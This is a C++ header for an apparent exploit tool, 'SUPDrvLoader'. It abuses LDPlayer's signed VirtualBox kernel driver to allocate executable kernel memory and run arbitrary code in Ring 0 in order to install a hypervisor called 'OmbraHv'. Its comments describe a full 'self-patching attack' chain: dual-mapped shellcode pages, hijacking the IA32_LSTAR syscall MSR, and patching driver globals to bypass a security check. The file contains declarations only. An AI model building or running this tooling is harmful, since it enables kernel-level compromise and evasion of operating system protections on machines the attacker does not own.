/**
 * @file supdrv_loader.h
 * @brief SUPDrv exploitation interface for Ring-0 code loading
 *
 * Uses Ld9BoxSup.sys (LDPlayer's VirtualBox 6.1.36 driver) to load
 * and execute code in kernel space without CVE dependencies.
 */

#pragma once
#include "supdrv_types.h"
#include <string>

namespace supdrv {

/**
 * SUPDrvLoader - Exploits SUPDrv to load code into kernel
 *
 * Usage:
 *   SUPDrvLoader loader;
 *   if (!loader.Initialize()) { handle error }
 *   PVOID kernelBase = loader.AllocateKernelMemory(payloadSize);
 *   if (!loader.LoadAndExecute(kernelBase, payloadData, payloadSize)) { handle error }
 *   // Payload's pfnModuleInit has been called - hypervisor is active
 */
class SUPDrvLoader {
public:
    SUPDrvLoader();
    ~SUPDrvLoader();

    // Non-copyable
    SUPDrvLoader(const SUPDrvLoader&) = delete;
    SUPDrvLoader& operator=(const SUPDrvLoader&) = delete;

    /**
     * Initialize - open device and establish session
     *
     * @return true on success
     *
     * Attempts to open \\.\Ld9BoxDrv first, falls back to \\.\VBoxDrv.
     * Performs version probing to find correct SUPDRV_IOC_VERSION.
     */
    bool Initialize();

    /**
     * Initialize with existing device handle
     *
     * @param hDevice Handle from DriverDeployer or other source
     * @param wszDeviceName Device name for logging
     * @return true on success
     *
     * Use this when the device has already been opened by DriverDeployer.
     * Takes ownership of the handle (will close on Cleanup).
     */
    bool Initialize(HANDLE hDevice, const wchar_t* wszDeviceName = L"");

    /**
     * Allocate executable kernel memory via SUP_IOCTL_LDR_OPEN
     *
     * @param cbSize Size of memory to allocate
     * @param szModuleName Optional module name (defaults to "OmbraHv")
     * @return Kernel address of allocated memory, or nullptr on failure
     *
     * The returned address is executable kernel memory suitable for
     * loading hypervisor code. Address will be in 0xFFFF... range.
     */
    void* AllocateKernelMemory(size_t cbSize, const char* szModuleName = "OmbraHv");

    /**
     * Load code and execute via pfnModuleInit
     *
     * @param pvKernelBase Address from AllocateKernelMemory
     * @param pvCode Pointer to code to load
     * @param cbCode Size of code
     * @param pfnEntryPoint Entry point offset within code (default: 0 = start)
     * @return true if load succeeded and pfnModuleInit returned 0
     *
     * After this call returns successfully:
     * - Code has been copied to pvKernelBase
     * - pfnModuleInit(pvKernelBase) has been called in Ring 0
     * - If pfnModuleInit patches VMExit handler, hypervisor is active
     */
    bool LoadAndExecute(void* pvKernelBase, const void* pvCode, size_t cbCode,
                        size_t pfnEntryPointOffset = 0);

    //-------------------------------------------------------------------------
    // Self-patching primitives for -618 bypass
    // These work AFTER cookie handshake, BEFORE LDR_OPEN
    //-------------------------------------------------------------------------

    /**
     * Allocate pages with dual R3/R0 mappings via SUP_IOCTL_PAGE_ALLOC_EX
     *
     * @param cPages Number of 4KB pages to allocate
     * @param ppvR3 [out] Usermode writable address
     * @param ppvR0 [out] Kernel executable address (same physical pages)
     * @return true on success
     *
     * This is KEY for the self-patching attack:
     * - Write shellcode to *ppvR3 from usermode
     * - Execute via *ppvR0 by hijacking IA32_LSTAR
     */
    bool PageAllocEx(uint32_t cPages, void** ppvR3, void** ppvR0);

    /**
     * Free pages allocated by PageAllocEx
     *
     * @param pvR3 The R3 address returned by PageAllocEx
     * @return true on success
     */
    bool PageFree(void* pvR3);

    /**
     * Read an MSR value via SUP_IOCTL_MSR_PROBER
     *
     * @param uMsr MSR number (e.g., MSR_IA32_LSTAR = 0xC0000082)
     * @param puValue [out] Read value
     * @param idCpu Target CPU (UINT32_MAX = any)
     * @return true on success
     */
    bool MsrRead(uint32_t uMsr, uint64_t* puValue, uint32_t idCpu = UINT32_MAX);

    /**
     * Write an MSR value via SUP_IOCTL_MSR_PROBER
     *
     * @param uMsr MSR number
     * @param uValue Value to write
     * @param idCpu Target CPU (UINT32_MAX = any)
     * @return true on success
     */
    bool MsrWrite(uint32_t uMsr, uint64_t uValue, uint32_t idCpu = UINT32_MAX);

    /**
     * Bypass the -618 check by patching driver globals via self-patching attack
     *
     * This implements the full attack chain:
     * 1. PageAllocEx -> get R3/R0 dual-mapped pages
     * 2. Write shellcode to R3 (patches ntoskrnl/hal flags)
     * 3. MsrRead IA32_LSTAR (save original)
     * 4. MsrWrite IA32_LSTAR = R0 shellcode
     * 5. Trigger syscall -> shellcode executes, patches flags
     * 6. MsrWrite IA32_LSTAR = original (restore)
     * 7. PageFree (cleanup)
     *
     * After success, LDR_OPEN will work!
     *
     * @param driverBase Base address of Ld9BoxSup.sys (from NtQuerySystemInformation)
     * @return true if bypass succeeded
     */
    bool Bypass618Check(uint64_t driverBase);

    /**
     * Get the kernel base address of a loaded driver via NtQuerySystemInformation
     *
     * @param wszDriverName Name of the driver (e.g., L"Ld9BoxSup.sys")
     * @return Driver base address, or 0 if not found
     *
     * Used to locate the driver's global flags for the -618 bypass.
     */
    static uint64_t GetDriverBaseAddress(const wchar_t* wszDriverName);

    /**
     * Get the detected driver version
     * @return Version constant (e.g., 0x00290008 for VBox 6.1.36+)
     */
    uint32_t GetDetectedVersion() const { return m_DetectedVersion; }

    /**
     * Get the session cookie
     * @return Session cookie for debugging/logging
     */
    uint32_t GetSessionCookie() const {
        return m_bInitialized ? m_Cookie.u.Out.u32SessionCookie : 0;
    }

    /**
     * Get the session kernel pointer
     * @return Kernel-mode session pointer
     */
    uint64_t GetSessionPointer() const {
        return m_bInitialized ? m_Cookie.u.Out.pSession : 0;
    }

    /**
     * Check if initialized successfully
     */
    bool IsInitialized() const { return m_bInitialized; }

    /**
     * Get device name that was successfully opened
     */
    const wchar_t* GetDeviceName() const { return m_DeviceName.c_str(); }

    /**
     * Cleanup - close device handle
     */
    void Cleanup();

    /**
     * Get last error message
     */
    const std::string& GetLastError() const { return m_LastError; }

private:
    HANDLE         m_hDevice;
    SUPCOOKIE      m_Cookie;
    uint32_t       m_DetectedVersion;
    bool           m_bInitialized;
    std::wstring   m_DeviceName;
    std::string    m_LastError;

    // Allocated memory tracking
    void*          m_pvAllocatedBase;
    size_t         m_cbAllocatedSize;

    /**
     * Try to open a device by name
     * @return HANDLE or INVALID_HANDLE_VALUE
     */
    HANDLE TryOpenDevice(const wchar_t* deviceName);

    /**
     * Open SUPDrv device (tries LDPlayer then VBox)
     * @return true if device opened successfully
     */
    bool OpenDevice();

    /**
     * Probe versions and acquire session cookie
     * @return true if a compatible version was found
     */
    bool ProbeVersionAndAcquireCookie();

    /**
     * Try a specific version for cookie acquisition
     * @return true if this version worked
     */
    bool TryCookieWithVersion(uint32_t version);

    /**
     * Set error message
     */
    void SetError(const char* format, ...);
};

} // namespace supdrv
